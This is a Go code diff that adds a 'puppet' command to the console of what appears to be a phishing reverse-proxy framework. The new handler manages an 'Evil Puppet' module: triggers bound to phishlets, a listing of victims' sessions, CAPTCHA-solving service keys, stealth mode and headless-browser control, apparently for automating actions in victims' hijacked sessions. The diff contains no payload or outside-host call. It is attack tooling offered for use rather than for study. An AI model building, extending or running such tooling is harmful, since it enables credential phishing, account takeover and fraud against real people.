@@ -165,6 +165,12 @@ func (t *Terminal) DoWork() {
 			} else {
 				t.hlp.Print(0)
 			}
+		case "puppet":
+			cmd_ok = true
+			err := t.handlePuppet(args[1:])
+			if err != nil {
+				log.Error("puppet: %v", err)
+			}
 		case "q", "quit", "exit":
 			do_quit = true
 			cmd_ok = true
@@ -1809,4 +1815,121 @@ func (t *Terminal) filterInput(r rune) (rune, bool) {
 		return r, false
 	}
 	return r, true
+}
+
+// handlePuppet handles the puppet command
+func (t *Terminal) handlePuppet(args []string) error {
+	pn := len(args)
+	if pn == 0 {
+		fmt.Println(`Evil Puppet Commands:
+  puppet enable                    - Enable Evil Puppet module
+  puppet disable                   - Disable Evil Puppet module
+  puppet config                    - Show Evil Puppet configuration
+  puppet triggers                  - List all triggers
+  puppet trigger add <json_file>   - Add trigger from JSON file
+  puppet trigger delete <id>       - Delete trigger by ID
+  puppet sessions                  - Show active puppet sessions
+  puppet sessions cleanup          - Cleanup old sessions
+  puppet captcha set <service> <key> - Set CAPTCHA service and API key
+  puppet stealth <on|off>          - Enable/disable stealth mode
+  puppet browser headless <on|off> - Set browser headless mode
+`)
+		return nil
+	}
+
+	switch args[0] {
+	case "enable":
+		t.cfg.EnablePuppet(true)
+		return nil
+	case "disable":
+		t.cfg.EnablePuppet(false)
+		return nil
+	case "config":
+		c := t.cfg.GetPuppetConfig()
+		log.Info("Enabled: %v", c.Enabled)
+		log.Info("Captcha Service: %s", c.CaptchaService)
+		log.Info("Stealth: %v", c.Stealth.Enabled)
+		log.Info("Headless: %v", c.Browser.Headless)
+		return nil
+	case "triggers":
+		triggers := t.cfg.GetPuppetConfig().Triggers
+		if len(triggers) == 0 {
+			log.Info("No triggers configured")
+			return nil
+		}
+		for _, tr := range triggers {
+			log.Info("[%s] %s (Enabled: %v, Phishlet: %s)", tr.Id, tr.Name, tr.Enabled, tr.Phishlet)
+		}
+		return nil
+	case "trigger":
+		if pn < 2 {
+			return fmt.Errorf("missing subcommand")
+		}
+		switch args[1] {
+		case "add":
+			if pn < 3 {
+				return fmt.Errorf("missing json file")
+			}
+			data, err := ioutil.ReadFile(args[2])
+			if err != nil {
+				return err
+			}
+			var trigger PuppetTrigger
+			if err := json.Unmarshal(data, &trigger); err != nil {
+				return err
+			}
+			return t.cfg.AddPuppetTrigger(&trigger)
+		case "delete":
+			if pn < 3 {
+				return fmt.Errorf("missing id")
+			}
+			return t.cfg.DeletePuppetTrigger(args[2])
+		}
+	case "sessions":
+		if pn > 1 && args[1] == "cleanup" {
+			t.cfg.CleanupPuppetSessions(1 * time.Hour) // Cleanup sessions older than 1 hour
+			log.Info("Puppet sessions cleaned up")
+			return nil
+		}
+		
+		sessions := t.cfg.GetPuppetSessionsForVictim("")
+		if len(sessions) == 0 {
+			log.Info("No active puppet sessions")
+			return nil
+		}
+		for _, s := range sessions {
+			log.Info("[%s] Victim: %s Status: %s", s.Id, s.VictimSession, s.Status)
+		}
+		return nil
+	case "captcha":
+		if pn >= 2 && args[1] == "set" {
+			if pn < 4 {
+				return fmt.Errorf("usage: puppet captcha set <service> <key>")
+			}
+			t.cfg.SetPuppetCaptchaService(args[2])
+			t.cfg.SetPuppetCaptchaAPIKey(args[3])
+			return nil
+		}
+	case "stealth":
+		if pn < 2 {
+			return fmt.Errorf("usage: puppet stealth <on|off>")
+		}
+		if args[1] == "on" {
+			t.cfg.SetPuppetStealthEnabled(true)
+		} else if args[1] == "off" {
+			t.cfg.SetPuppetStealthEnabled(false)
+		}
+		return nil
+	case "browser":
+		if pn >= 3 && args[1] == "headless" {
+			if args[2] == "on" {
+				t.cfg.SetPuppetBrowserHeadless(true)
+			} else if args[2] == "off" {
+				t.cfg.SetPuppetBrowserHeadless(false)
+			}
+			return nil
+		}
+	}
+	
+	return fmt.Errorf("unknown command: puppet %s", args[0])
 }
